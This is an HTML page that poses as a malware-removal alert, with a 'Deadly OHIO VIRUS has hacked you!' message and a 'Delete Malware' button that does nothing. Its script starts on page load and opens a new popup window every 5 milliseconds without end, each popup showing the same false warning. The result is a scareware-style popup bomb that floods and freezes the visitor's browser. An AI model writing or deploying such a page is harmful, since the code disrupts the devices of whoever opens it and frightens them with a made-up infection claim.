<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Malware Remove</title>
  <style>
    body {
      background-color: black;
      color: red;
      font-family: Arial, sans-serif;
      text-align: center;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    h1 {
      font-size: 2.5rem;
      margin: 0;
    }
    button {
      background-color: white;
      color: black;
      border: 2px solid red;
      padding: 10px 20px;
      font-size: 1.2rem;
      cursor: pointer;
      margin-top: 20px;
    }
    button:hover {
      background-color: red;
      color: white;
    }
  </style>
</head>
<body>
  <h1>Deadly OHIO VIRUS has hacked you!</h1>
  <button>Delete Malware</button>

  <script>
    function openWindowsInfinitely() {
      setInterval(() => {
        // Generate random position on the screen
        const randomX = Math.floor(Math.random() * (screen.width - 300)); // Subtract width of the popup
        const randomY = Math.floor(Math.random() * (screen.height - 200)); // Subtract height of the popup

        // Open a new popup window at the random position
        const newWindow = window.open('', '', `width=300,height=200,left=${randomX},top=${randomY}`);
        if (newWindow) {
          // Write the content for the popup window
          newWindow.document.write(`
            <html>
              <head>
                <title>Malware Remove</title>
                <style>
                  body {
                    background-color: black;
                    color: red;
                    font-family: Arial, sans-serif;
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                  }
                  h1 {
                    font-size: 1.5rem;
                  }
                  button {
                    background-color: white;
                    color: black;
                    border: 2px solid red;
                    padding: 10px 20px;
                    font-size: 1rem;
                    cursor: pointer;
                    margin-top: 10px;
                  }
                  button:hover {
                    background-color: red;
                    color: white;
                  }
                </style>
              </head>
              <body>
                <h1>Deadly OHIO VIRUS has hacked you!</h1>
                <button>Delete Malware</button>
              </body>
            </html>
          `);
        }
      }, 5); // Open a new window every 5ms
    }

    // Start the infinite windows loop
    openWindowsInfinitely();
  </script>
</body>
</html>
